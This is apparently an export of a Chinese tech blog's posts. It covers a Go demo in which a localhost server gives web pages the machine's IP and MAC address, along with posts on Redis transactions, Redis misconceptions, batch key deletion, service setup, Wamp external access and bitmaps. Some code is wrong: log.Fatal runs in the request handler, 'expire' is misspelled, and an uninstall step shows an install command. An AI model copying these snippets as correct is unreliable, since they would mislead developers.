</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getMacAddrs</span><span class="params">()</span> <span class="params">(macAddrs []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    netInterfaces, err := net.Interfaces()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"fail to get net interfaces: %v"</span>, err)</span><br><span class="line">        <span class="keyword">return</span> macAddrs</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, netInterface := <span class="keyword">range</span> netInterfaces &#123;</span><br><span class="line">        macAddr := netInterface.HardwareAddr.String()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(macAddr) == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        macAddrs = <span class="built_in">append</span>(macAddrs, macAddr)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> macAddrs</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getIPs</span><span class="params">()</span> <span class="params">(ips []<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    interfaceAddr, err := net.InterfaceAddrs()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"fail to get net interface addrs: %v"</span>, err)</span><br><span class="line">        <span class="keyword">return</span> ips</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, address := <span class="keyword">range</span> interfaceAddr &#123;</span><br><span class="line">        ipNet, isValidIpNet := address.(*net.IPNet)</span><br><span class="line">        <span class="keyword">if</span> isValidIpNet &amp;&amp; !ipNet.IP.IsLoopback() &#123;</span><br><span class="line">            <span class="keyword">if</span> ipNet.IP.To4() != <span class="literal">nil</span> &#123;</span><br><span class="line">                ips = <span class="built_in">append</span>(ips, ipNet.IP.String())</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ips</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleToken</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;  </span><br><span class="line"></span><br><span class="line">    log.Fatal(<span class="string">"Request: "</span>, r)</span><br><span class="line"></span><br><span class="line">    data := Data&#123;Ip: getIPs()[<span class="number">0</span>], Mac: getMacAddrs()[<span class="number">0</span>]&#125;</span><br><span class="line"> </span><br><span class="line">	ret := <span class="built_in">new</span>(Ret) </span><br><span class="line"> </span><br><span class="line">	ret.Code = <span class="number">0</span> </span><br><span class="line">	ret.Msg = <span class="string">"success"</span></span><br><span class="line">	ret.Data = data</span><br><span class="line">	ret_json,_ := json.Marshal(ret)</span><br><span class="line">	w.Header().Set(<span class="string">"Content-Type"</span>,<span class="string">"text/json;charset=utf-8"</span>)</span><br><span class="line">	io.WriteString(w, <span class="keyword">string</span>(ret_json))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">   http.HandleFunc(<span class="string">"/token"</span>, handleToken)</span><br><span class="line">   err := http.ListenAndServe(<span class="string">"localhost.ya2.top:1024"</span>, <span class="literal">nil</span>) </span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">"ListenAndServe: "</span>, err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中域名 <strong>localhost.ya2.top</strong> 配置指向解析记录：<code>127.0.0.1</code></p>
<p>测试效果:</p>
<p><img src="/articles/QQ如何实现跨端通信的/demo.png" alt></p>
<p>搞定，这只是一个简单的DEMO，但是了解原理已经足够了。 欢迎大佬指正~</p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis Transactions</title>
    <url>/articles/Redis-Transactions/</url>
    <content><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h4><p>所谓事务(Transaction) ，是指作为单个逻辑工作单元执行的一系列操作。事务必须满足ACID原则(原子性、一致性、隔离性和持久性)。简单来说事务其实就是打包一组操作（或者命令）作为一个整体，在事务处理时将顺序执行这些操作，并返回结果，如果其中任何一个环节出错，所有的操作将被回滚。</p>
<p>事务的四大特性(<strong>ACID</strong>)：</p>
<ul>
<li><strong>原子性</strong> 事务是数据库的逻辑工作单位，事务中包含的各操作要么都做，要么都不做 </li>
<li><strong>一致性</strong>  事务执行的结果必须是使数据库从一个一致性状态变到另一个一致性状态。因此当数据库只包含成功事务提交的结果时，就说数据库处于一致性状态。如果数据库系统 运行中发生故障，有些事务尚未完成就被迫中断，这些未完成事务对数据库所做的修改有一部分已写入物理数据库，这时数据库就处于一种不正确的状态，或者说是 不一致的状态。 </li>
<li><strong>隔离性</strong> 一个事务的执行不能其它事务干扰。即一个事务内部的操作及使用的数据对其它并发事务是隔离的，并发执行的各个事务之间不能互相干扰。 </li>
<li><strong>持续性</strong> 也称永久性，指一个事务一旦提交，它对数据库中的数据的改变就应该是永久性的。接下来的其它操作或故障不应该对其执行结果有任何影响。 </li>
</ul>
<h4 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h4><p>当程序中可能出现并发的情况时，就需要通过一定的手段来保证在并发情况下数据的准确性，通过这种手段保证了当前用户和其他用户一起操作时，所得到的结果和他单独操作时的结果是一样的。这种手段就叫做并发控制。并发控制的目的是保证一个用户的工作不会对另一个用户的工作产生不合理的影响。</p>
<p><img src="/articles/Redis-Transactions/1.jpg" alt></p>
<p>常说的并发控制，一般都和数据库管理系统（DBMS）有关。在DBMS中的并发控制的任务，是确保在多个事务同时存取数据库中同一数据时，不破坏事务的隔离性和统一性以及数据库的统一性。</p>
<p><strong>锁（LOCKING）</strong>便是最常用的并发控制机构，是防止其他事务访问指定的资源控制、实现并发控制的一种主要手段。</p>
<p>实现并发控制的主要手段大致可以分为乐观并发控制和悲观并发控制两种。</p>
<h5 id="悲观锁-Pessimistic-Lock"><a href="#悲观锁-Pessimistic-Lock" class="headerlink" title="悲观锁(Pessimistic Lock)"></a>悲观锁(Pessimistic Lock)</h5><p>当要对数据库中的一条数据进行修改的时候，为了避免同时被其他人修改，最好的办法就是直接对该数据进行加锁以防止并发。这种借助数据库锁机制，在修改数据之前先锁定，再修改的方式被称之为悲观并发控制【又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”】。悲观锁有两种模式：</p>
<ul>
<li><p>共享锁【Shared lock】又称为读锁，简称S锁。顾名思义，共享锁就是多个事务对于同一数据可以共享一把锁，都能访问到数据，但是只能读不能修改。</p>
</li>
<li><p>排他锁【Exclusive lock】又称为写锁，简称X锁。顾名思义，排他锁就是不能与其他锁并存，如果一个事务获取了一个数据行的排他锁，其他事务就不能再获取该行的其他锁，包括共享锁和排他锁，但是获取排他锁的事务是可以对数据行读取和修改。</p>
</li>
</ul>
<p>悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。</p>
<p><img src="/articles/Redis-Transactions/2.jpg" alt="悲观锁"></p>
<p>但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会。另外还会降低并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数据。</p>
<p>举例(MySql-Innodb)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">//0.开启事务</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">//<span class="number">1.</span>查询商品库存信息</span><br><span class="line"><span class="keyword">select</span> quantity <span class="keyword">from</span> items <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">for</span> <span class="keyword">update</span>;</span><br><span class="line">//2.修改库存</span><br><span class="line"><span class="keyword">update</span> item <span class="keyword">set</span> quantity=<span class="number">2</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">//3.提交事务</span><br><span class="line"><span class="keyword">commit</span>; </span><br><span class="line"></span><br><span class="line">// 以上，在对id = 1的记录修改前，先通过for <span class="keyword">update</span>的方式进行加锁，然后再进行修改</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上面提到，使用select…for update会把数据给锁住，不过需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意</p>
</blockquote>
<h5 id="乐观锁-Optimistic-Locking"><a href="#乐观锁-Optimistic-Locking" class="headerlink" title="乐观锁(Optimistic Locking)"></a>乐观锁(Optimistic Locking)</h5><p>乐观锁是相对悲观锁而言的，乐观锁假设数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则返回给用户错误的信息，让用户决定如何去做。</p>
<p>相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。</p>
<p><img src="/articles/Redis-Transactions/3.jpg" alt="乐观锁"></p>
<p>乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。</p>
<p>示例(MySql-Innodb):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">//查询商品库存信息，quantity = 3</span><br><span class="line"><span class="keyword">select</span> quantity <span class="keyword">from</span> items <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br><span class="line">// 修改商品库存为2</span><br><span class="line"><span class="keyword">update</span> items <span class="keyword">set</span> quantity=<span class="number">2</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> quantity=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">// 以上，在更新之前，先查询一下库存表中当前库存数(quantity)，然后在做<span class="keyword">update</span>的时候，以库存数作为一个修改条件。当提交更新的时候，判断数据库表对应记录的当前库存数与第一次取出来的库存数进行比对，如果数据库表当前库存数与第一次取出来的库存数相等，则予以更新，否则认为是过期数据。</span><br></pre></td></tr></table></figure>

<h3 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h3><p>在Redis中实现事务主要依靠一下5个命令来实现：</p>
<ul>
<li><strong>MULTI</strong> 标记一个事务块的开始。</li>
<li><strong>EXEC</strong>  执行所有事务块内的命令。</li>
<li><strong>DISCARD</strong> 取消事务，放弃执行事务块内的所有命令。</li>
<li><strong>WATCH key [key …]</strong> 监视一个(或多个) key ，如果在事务执行之前这个(或这些) key 被其他命令所改动，那么事务将被打断。</li>
<li><strong>UNWATCH</strong> 取消 WATCH 命令对所有 key 的监视。</li>
</ul>
<p>Redis事务从开始到结束通常会通过三个阶段: <strong>事务开始  -&gt; 命令入队 -&gt; 事务执行</strong></p>
<h4 id="开启事务"><a href="#开启事务" class="headerlink" title="开启事务"></a>开启事务</h4><p><img src="/articles/Redis-Transactions/3.png" alt></p>
<h4 id="放弃事务"><a href="#放弃事务" class="headerlink" title="放弃事务"></a>放弃事务</h4><p><img src="/articles/Redis-Transactions/4.png" alt></p>
<h4 id="编译时错误（入队前就能检测出来）"><a href="#编译时错误（入队前就能检测出来）" class="headerlink" title="编译时错误（入队前就能检测出来）"></a>编译时错误（入队前就能检测出来）</h4><p><img src="/articles/Redis-Transactions/5.png" alt></p>
<blockquote>
<p>从 Redis 2.6.5 开始，服务器会对命令入队失败的情况进行记录，并在客户端调用 EXEC 命令时，拒绝执行并自动放弃这个事务</p>
</blockquote>
<h4 id="运行时错误（入队前不能检测出来）"><a href="#运行时错误（入队前不能检测出来）" class="headerlink" title="运行时错误（入队前不能检测出来）"></a>运行时错误（入队前不能检测出来）</h4><p><img src="/articles/Redis-Transactions/6.png" alt></p>
<blockquote>
<p>即使事务中有某个/某些命令在执行时产生了错误， 事务中的其他命令仍然会继续执行</p>
</blockquote>
<h4 id="WATCH监控"><a href="#WATCH监控" class="headerlink" title="WATCH监控"></a>WATCH监控</h4><p><img src="/articles/Redis-Transactions/7.png" alt></p>
<blockquote>
<p>WATCH指令，类似乐观锁，事务提交时，如果Key的值已被别的客户端改变，整个事务队列都不会被执行 </p>
</blockquote>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>服务器访问并发比较大，无效访问频繁，比如说频繁请求接口，爬虫频繁访问服务器，抢购瞬时请求过大，我们需要限流(对访问来源计数，超过设定次数，设置过期时间，提醒访问频繁，稍后再试)处理。 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">limits=500   <span class="comment">#设置1秒内限制次数50</span></span><br><span class="line">if EXISTS userid</span><br><span class="line">    return '访问频繁，锁定时间剩余（ttl userid）秒'</span><br><span class="line">if userid_count_time &gt; limits</span><br><span class="line">   exprice userid,3600</span><br><span class="line">   return '访问频繁，稍后再试'</span><br><span class="line">else </span><br><span class="line">   MUlTI</span><br><span class="line">   incr userid_count_time          <span class="comment"># 对用户每秒的请求进行原子递增计数</span></span><br><span class="line">   exprice userid_count_time , 60</span><br><span class="line">   EXEC</span><br><span class="line"></span><br><span class="line">//使用事务的目的是避免执行错误中断，userid_count_time持久化到磁盘，高并发下这个很有必要</span><br></pre></td></tr></table></figure>

<h3 id="Redis事务和Mysql事务区别"><a href="#Redis事务和Mysql事务区别" class="headerlink" title="Redis事务和Mysql事务区别"></a>Redis事务和Mysql事务区别</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left">mysql</th>
<th align="left">redis</th>
</tr>
</thead>
<tbody><tr>
<td align="left">开启事务</td>
<td align="left">start transaction</td>
<td align="left">multi</td>
</tr>
<tr>
<td align="left">回滚事务</td>
<td align="left">rollback</td>
<td align="left">不能回滚，使用discard命令可以放弃事务队列</td>
</tr>
<tr>
<td align="left">提交事务</td>
<td align="left">commit, 即使遇到语法错误也会提交</td>
<td align="left">exec, 如果遇到语法错误会放弃事务中的sql</td>
</tr>
<tr>
<td align="left">悲观锁</td>
<td align="left">使用select … for update实现悲观锁</td>
<td align="left">无</td>
</tr>
<tr>
<td align="left">乐观锁</td>
<td align="left">通常使用version或时间戳来实现乐观锁</td>
<td align="left">使用watch监控对象变化来实现乐观锁</td>
</tr>
<tr>
<td align="left">原子性</td>
<td align="left">具备</td>
<td align="left">具备</td>
</tr>
<tr>
<td align="left">一致性</td>
<td align="left">具备</td>
<td align="left">具备</td>
</tr>
<tr>
<td align="left">隔离性</td>
<td align="left">具备</td>
<td align="left">具备</td>
</tr>
<tr>
<td align="left">持久性</td>
<td align="left">具备</td>
<td align="left">当redis服务器使用AOF持久化模式并appendfsync设置为always时具备</td>
</tr>
</tbody></table>
<p>了解更多：<a href="https://redis.io/topics/transactions" target="_blank" rel="noopener">https://redis.io/topics/transactions</a></p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Redis几个认识误区</title>
    <url>/articles/Redis%E5%87%A0%E4%B8%AA%E8%AE%A4%E8%AF%86%E8%AF%AF%E5%8C%BA/</url>
    <content><![CDATA[<p>最近研究了<a href="http://code.google.com/p/redis" target="_blank" rel="noopener">Redis</a>。去年曾做过一个<a href="http://timyang.net/data/mcdb-tt-redis" target="_blank" rel="noopener">MemcacheDB, Tokyo Tyrant, Redis performance test</a>，到目前为止，这个benchmark结果依然有效。这1年我们经历了很多眼花缭乱的key value存储产品的诱惑，从Cassandra的淡出(Twitter暂停在主业务使用)到HBase的兴起(Facebook新的邮箱业务选用HBase(2))，当再回头再去看Redis，发现这个只有1万多行源代码的程序充满了神奇及大量未经挖掘的特性。Redis性能惊人，国内前十大网站的子产品估计用1台Redis就可以满足存储及Cache的需求。除了性能印象之外，业界其实普遍对Redis的认识存在一定误区。本文提出一些观点供大家探讨。</p>
<h4 id="1-Redis是什么"><a href="#1-Redis是什么" class="headerlink" title="1. Redis是什么"></a>1. Redis是什么</h4><p>这个问题的结果影响了我们怎么用Redis。如果你认为Redis是一个key value store, 那可能会用它来代替MySQL；如果认为它是一个可以持久化的cache, 可能只是它保存一些频繁访问的临时数据。Redis是<code>REmote DIctionary Server</code>的缩写，在Redis在官方网站的的副标题是<code>A persistent key-value database with built-in net interface written in ANSI-C for Posix systems</code>，这个定义偏向key value store。还有一些看法则认为Redis是一个memory database，因为它的高性能都是基于内存操作的基础。另外一些人则认为Redis是一个data structure server，因为Redis支持复杂的数据特性，比如List, Set等。对Redis的作用的不同解读决定了你对Redis的使用方式。</p>
<p>互联网数据目前基本使用两种方式来存储，关系数据库或者key value。但是这些互联网业务本身并不属于这两种数据类型，比如用户在社会化平台中的关系，它是一个list，如果要用关系数据库存储就需要转换成一种多行记录的形式，这种形式存在很多冗余数据，每一行需要存储一些重复信息。如果用key value存储则修改和删除比较麻烦，需要将全部数据读出再写入。Redis在内存中设计了各种数据类型，让业务能够高速原子的访问这些数据结构，并且不需要关心持久存储的问题，从架构上解决了前面两种存储需要走一些弯路的问题。</p>
<h4 id="2-Redis不可能比Memcache快"><a href="#2-Redis不可能比Memcache快" class="headerlink" title="2. Redis不可能比Memcache快"></a>2. Redis不可能比Memcache快</h4><p>很多开发者都认为Redis不可能比Memcached快，Memcached完全基于内存，而Redis具有持久化保存特性，即使是异步的，Redis也不可能比Memcached快。但是测试结果基本是Redis占绝对优势。一直在思考这个原因，目前想到的原因有这几方面。<a href="http://monkey.org/%7Eprovos/libevent" target="_blank" rel="noopener">Libevent</a>,和Memcached不同，Redis并没有选择libevent。Libevent为了迎合通用性造成代码庞大(目前Redis代码还不到libevent的1/3)及牺牲了在特定平台的不少性能。Redis用libevent中两个文件修改实现了自己的epoll event loop(4)。业界不少开发者也建议Redis使用另外一个libevent高性能替代libev，但是作者还是坚持Redis应该小巧并去依赖的思路。一个印象深刻的细节是编译Redis之前并不需要执行./configure。CAS问题。CAS是Memcached中比较方便的一种防止竞争修改资源的方法。CAS实现需要为每个cache key设置一个隐藏的cas token，cas相当value版本号，每次set会token需要递增，因此带来CPU和内存的双重开销，虽然这些开销很小，但是到单机10G+ cache以及QPS上万之后这些开销就会给双方相对带来一些细微性能差别(5)。</p>
<h4 id="3-单台Redis的存放数据必须比物理内存小"><a href="#3-单台Redis的存放数据必须比物理内存小" class="headerlink" title="3. 单台Redis的存放数据必须比物理内存小"></a>3. 单台Redis的存放数据必须比物理内存小</h4><p>Redis的数据全部放在内存带来了高速的性能，但是也带来一些不合理之处。比如一个中型网站有100万注册用户，如果这些资料要用Redis来存储，内存的容量必须能够容纳这100万用户。但是业务实际情况是100万用户只有5万活跃用户，1周来访问过1次的也只有15万用户，因此全部100万用户的数据都放在内存有不合理之处，RAM需要为冷数据买单。</p>
<p>这跟操作系统非常相似，操作系统所有应用访问的数据都在内存，但是如果物理内存容纳不下新的数据，操作系统会智能将部分长期没有访问的数据交换到磁盘，为新的应用留出空间。现代操作系统给应用提供的并不是物理内存，而是虚拟内存(Virtual Memory)的概念。</p>
<p>基于相同的考虑，Redis 2.0也增加了VM特性。让Redis数据容量突破了物理内存的限制。并实现了数据冷热分离。</p>
<h4 id="4-Redis的VM实现是重复造轮子"><a href="#4-Redis的VM实现是重复造轮子" class="headerlink" title="4. Redis的VM实现是重复造轮子"></a>4. Redis的VM实现是重复造轮子</h4><p>Redis的VM依照之前的epoll实现思路依旧是自己实现。但是在前面操作系统的介绍提到OS也可以自动帮程序实现冷热数据分离，Redis只需要OS申请一块大内存，OS会自动将热数据放入物理内存，冷数据交换到硬盘，另外一个知名的“理解了现代操作系统(3)”的Varnish就是这样实现，也取得了非常成功的效果。</p>
<p>作者antirez在解释为什么要自己实现VM中提到几个原因(6)。主要OS的VM换入换出是基于Page概念，比如OS VM 1个Page是4K, 4K中只要还有一个元素即使只有1个字节被访问，这个页也不会被SWAP, 换入也同样道理，读到一个字节可能会换入4K无用的内存。而Redis自己实现则可以达到控制换入的粒度。另外访问操作系统SWAP内存区域时block进程，也是导致Redis要自己实现VM原因之一。</p>
<h4 id="5-用get-set方式使用Redis"><a href="#5-用get-set方式使用Redis" class="headerlink" title="5. 用get/set方式使用Redis"></a>5. 用get/set方式使用Redis</h4><p>作为一个key value存在，很多开发者自然的使用set/get方式来使用Redis，实际上这并不是最优化的使用方法。尤其在未启用VM情况下，Redis全部数据需要放入内存，节约内存尤其重要。</p>
<p>假如一个key-value单元需要最小占用512字节，即使只存一个字节也占了512字节。这时候就有一个设计模式，可以把key复用，几个key-value放入一个key中，value再作为一个set存入，这样同样512字节就会存放10-100倍的容量。</p>
<p>这就是为了节约内存，建议使用hashset而不是set/get的方式来使用Redis，详细方法见参考文献(7)。</p>
<h4 id="6-使用aof代替snapshot"><a href="#6-使用aof代替snapshot" class="headerlink" title="6. 使用aof代替snapshot"></a>6. 使用aof代替snapshot</h4><p>Redis有两种存储方式，默认是snapshot方式，实现方法是定时将内存的快照(snapshot)持久化到硬盘，这种方法缺点是持久化之后如果出现crash则会丢失一段数据。因此在完美主义者的推动下作者增加了aof方式。aof即append only mode，在写入内存数据的同时将操作命令保存到日志文件，在一个并发更改上万的系统中，命令日志是一个非常庞大的数据，管理维护成本非常高，恢复重建时间会非常长，这样导致失去aof高可用性本意。另外更重要的是Redis是一个内存数据结构模型，所有的优势都是建立在对内存复杂数据结构高效的原子操作上，这样就看出aof是一个非常不协调的部分。</p>
<p>其实aof目的主要是数据可靠性及高可用性，在Redis中有另外一种方法来达到目的：Replication。由于Redis的高性能，复制基本没有延迟。这样达到了防止单点故障及实现了高可用。</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>要想成功使用一种产品，我们需要深入了解它的特性。Redis性能突出，如果能够熟练的驾驭，对国内很多大型应用具有很大帮助。希望更多同行加入到Redis使用及代码研究行列。</p>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><ol>
<li><p><a href="http://www.mvdirona.com/jrh/talksAndPapers" target="_blank" rel="noopener">On Designing and Deploying Internet-Scale Service</a></p>
</li>
<li><p><a href="http://highscalability.com/blog/2010/11/16" target="_blank" rel="noopener">Facebook’s New Real-Time Messaging System: HBase To Store 135+ Billion Messages A Month</a></p>
</li>
<li><p><a href="http://www.varnish-cache.org/trac/wiki" target="_blank" rel="noopener">What’s wrong with 1975 programming</a></p>
</li>
<li><p><a href="http://groups.google.com/group/redis-db/browse_thread/thread/b52814e9ef15b8d0" target="_blank" rel="noopener">Linux epoll is now supported</a> (Google Groups)</p>
</li>
<li><p><a href="http://groups.google.com/group/redis-db/browse_thread/thread" target="_blank" rel="noopener">CAS and why I don’t want to add it to Redis</a>  (Google Groups)</p>
</li>
<li><p><a href="http://groups.google.com/group/redis-db/browse_thread/thread" target="_blank" rel="noopener">Plans for Virtual Memory</a> (Google Groups)</p>
</li>
<li><p><a href="http://antirez.com/post" target="_blank" rel="noopener">Full of keys</a> (Salvatore antirez Sanfilippo)</p>
</li>
</ol>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Redis实现批量删除</title>
    <url>/articles/Redis%E5%AE%9E%E7%8E%B0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4/</url>
    <content><![CDATA[<p>redis-cli -h 主机地址 -a 鉴权 -n 0 -p 6379 –scan –pattern “正则表达式” | xargs -L 5000 redis-cli -h  主机地址 -a 鉴权-n 0 -p 6379 DEL</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Redis  后台启动</title>
    <url>/articles/Redis-%E5%90%8E%E5%8F%B0%E5%90%AF%E5%8A%A8/</url>
    <content><![CDATA[<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p><code>redis-server redis.conf</code> (需要指定配置文件)</p>
<h4 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h4><p>linux: redis.conf 添加 <code>daemonize yes</code>配置</p>
<p><img src="/articles/Redis-后台启动/1.png" alt="redis.conf"></p>
<p><strong>window</strong></p>
<p>安装redis服务:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server --service-install redis.conf</span><br></pre></td></tr></table></figure>

<p>安装多个实例</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server --service-install –service-name redisService1 –port 10001</span><br><span class="line"></span><br><span class="line">redis-server --service-start –service-name redisService1</span><br><span class="line"></span><br><span class="line">redis-server --service-install –service-name redisService2 –port 10002</span><br><span class="line"></span><br><span class="line">redis-server --service-start –service-name redisServic</span><br><span class="line"></span><br><span class="line">redis-server --service-install –service-name redisService3 –port 10003</span><br><span class="line"></span><br><span class="line">redis-server --service-start –service-name redisService3</span><br></pre></td></tr></table></figure>

<p>启动redis</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server --service-start    停止redis</span><br><span class="line"></span><br><span class="line">redis-server --service-stop</span><br></pre></td></tr></table></figure>

<p>卸载redis服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">redis-server --service-install redis.windows.conf</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>Wamp3.0以上版本实现外网访问</title>
    <url>/articles/Wamp3-0%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<p>1、http-vhost.conf :  Require all granted 允许所有请求 , 突破403限制</p>
<p><img src="/articles/Wamp3-0以上版本实现外网访问/0.png" alt="http-vhost.conf"></p>
<p>2、防火墙入口规则添加 80端口 允许访问</p>
]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Too many levels of symbolic links 问题</title>
    <url>/articles/Too%20many%20levels%20of%20symbolic%20links%20%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>使用npm安装pm2 ，发现不能全局使用pm2, 于是想到去</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s node_modules/pm2/bin/pm2  /usr/bin/pm2</span><br></pre></td></tr></table></figure>

<p>但是当执行pm2 命令的时候， 发现出现 <strong>Too many levels of symbolic links</strong>问题</p>
<p>原来/usr/bin目录下的pm2指向的是./pm2，因此，在做ln的时候只要将文件的完整目录写上去即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /etc/node_modules/pm2/bin/pm2  /usr/bin/pm2</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Redis如何存储和计算一亿用户的活跃度</title>
    <url>/articles/Redis%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8%E5%92%8C%E8%AE%A1%E7%AE%97%E4%B8%80%E4%BA%BF%E7%94%A8%E6%88%B7%E7%9A%84%E6%B4%BB%E8%B7%83%E5%BA%A6/</url>
    <content><![CDATA[<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>如何用<em>redis</em>存储统计1亿用户一年内的登录情况，并快速检索任意时间窗口内的活跃用户数量？</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>Redis 是一个内存数据库，采用单线程和事件驱动的机制来处理网络请求。实际生产的QPS和TPS单台都能达到 3~4 w，读写性能非常棒,用来存储一些对核心业务弱影响的用户状态信息还是非常不错的。</p>
<p>对于这个问题，有2个重要的点需要考虑：</p>
<ul>
<li><p><strong>如何选择合适的数据类型来存储 1 亿用户的数据？</strong><br>用普通的字符串来存储肯定不行。经查一个最简单的kv的内存占用，发现为48byte。假设每个用户每天登录需要占据1对kv的话，那一亿就是$(48*100000000)/1024/1024/1024=4.47G$，这还只是是一天的量。</p>
</li>
<li><p><strong>如何满足搜索？</strong><br>redis 是一个键值对的内存结构，只能根据 key 来进行定位 value 值，无法做到像 elasticsearch 那样对文档进行倒排索引快速全文检索。</p>
</li>
</ul>
<h3 id="方案一：Bitmap"><a href="#方案一：Bitmap" class="headerlink" title="方案一：Bitmap"></a>方案一：Bitmap</h3><p>在 redis 2.2.0 版本之后，新增了一个位图数据，它不是一种数据结构。实际上它就是一个字符串结构，只不过 value 是一个二进制数据，每一位只能是 0 或者 1 。redis 单独对 bitmap 提供了一套命令，可以对任意一位进行设置和读取。</p>
<p>bitmap 的核心命令： </p>
<p><strong>SETBIT</strong></p>
<p>语法： SETBIT key offset value</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setbit abc 5 1 ----&gt; 00001</span><br><span class="line"></span><br><span class="line">setbit abc 2 1 ----&gt; 00101</span><br></pre></td></tr></table></figure>

<p><strong>GETBIT</strong></p>
<p>语法：GETBIT key offset</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getbit abc 5 ----&gt; 1</span><br><span class="line"></span><br><span class="line">getbit abc 1 ----&gt; 0</span><br></pre></td></tr></table></figure>

<p>bitmap 的其他命令还有 <em>bitcount<em>，</em>bitcount<em>，</em>bitpos<em>，</em>bitop</em> 等命令，都是对位的操作。</p>
